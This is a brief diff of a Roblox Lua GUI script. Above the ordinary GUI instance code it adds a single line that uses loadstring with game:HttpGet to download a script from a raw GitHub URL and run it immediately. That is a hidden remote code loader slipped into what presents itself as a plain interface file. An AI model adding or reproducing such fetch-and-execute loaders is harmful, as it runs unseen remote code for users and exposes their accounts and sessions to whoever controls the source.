@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sofjskdkkco/script/refs/heads/main/script"))()
+
 -- Instances:
 
 local GUI = {
